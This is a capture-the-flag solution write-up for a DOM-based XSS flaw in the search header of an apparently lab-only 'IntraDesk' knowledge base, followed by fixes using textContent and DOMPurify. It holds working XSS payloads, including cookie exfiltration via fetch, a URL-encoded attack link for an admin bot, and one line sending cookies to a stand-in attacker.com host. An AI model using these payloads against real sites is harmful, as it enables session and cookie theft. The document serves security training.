# CTF Challenge Solution

## Challenge: IntraDesk Knowledge Base - DOM XSS

### Objective
Exploit a DOM-based XSS vulnerability in the Knowledge Base search feature to exfiltrate the admin's flag.

### Vulnerability Location
The vulnerability exists in [apps/web/src/pages/KnowledgeBase.tsx](apps/web/src/pages/KnowledgeBase.tsx) in the `renderResultsHeader()` function.

**Vulnerable Code:**
```typescript
function renderResultsHeader() {
  const resultsDiv = document.getElementById('results-header');
  if (!resultsDiv) return null;

  let headerHTML = '<h2>';
  if (searchTerm) {
    // ⚠️ UNSAFE: directly inserting user input into innerHTML
    headerHTML += 'Results for "' + searchTerm + '"';
  }
  // ...
  resultsDiv.innerHTML = headerHTML;
}
```

### Exploitation Steps

1. **Identify the XSS vulnerability**
   - The search parameter from the URL is directly inserted into the DOM via `innerHTML`
   - No sanitization is performed on user input
   - Try: `/kb?search=<b>test</b>` - you'll see the HTML renders

2. **Craft the payload**
   Since we're inside an HTML context within double quotes, we need to break out:
   ```
   "><img src=x onerror=alert(document.cookie)>
   ```

3. **Exfiltrate the flag**
   The admin has a non-HttpOnly `flag` cookie. Create a payload to send it to the `/api/collect` endpoint:
   ```
   "><img src=x onerror=fetch('/api/collect?d='+document.cookie)>
   ```

4. **URL encode and submit**
   Full URL:
   ```
   http://localhost:5174/kb?search=%22%3E%3Cimg%20src%3Dx%20onerror%3Dfetch(%27/api/collect%3Fd%3D%27%2Bdocument.cookie)%3E
   ```

5. **Report the URL**
   - Go to `/report`
   - Paste the crafted URL
   - Submit the report
   - The admin bot will visit it and execute your payload

6. **Retrieve the flag**
   - The flag will be logged in the `exfil_logs` table
   - Check your user's flag or query the API (if admin access is obtained)

### Alternative Payloads

**Basic PoC:**
```
"><script>alert('XSS')</script>
```

**Cookie exfil via image:**
```
"><img src="http://attacker.com/?c="+document.cookie>
```

**Fetch admin endpoint:**
```
"><img src=x onerror="fetch('/api/admin/flag').then(r=>r.json()).then(d=>fetch('/api/collect?d='+d.flag))">
```

### Defense

To fix this vulnerability:

1. **Use textContent instead of innerHTML:**
   ```typescript
   resultsDiv.textContent = `Results for "${searchTerm}"`;
   ```

2. **Or use DOM manipulation:**
   ```typescript
   const h2 = document.createElement('h2');
   h2.textContent = `Results for "${searchTerm}"`;
   resultsDiv.innerHTML = '';
   resultsDiv.appendChild(h2);
   ```

3. **Or use a sanitization library:**
   ```typescript
   import DOMPurify from 'dompurify';
   resultsDiv.innerHTML = DOMPurify.sanitize(headerHTML);
   ```

### Flag Format
`CTF{admin_default_flag}` or user-specific flags generated during registration.
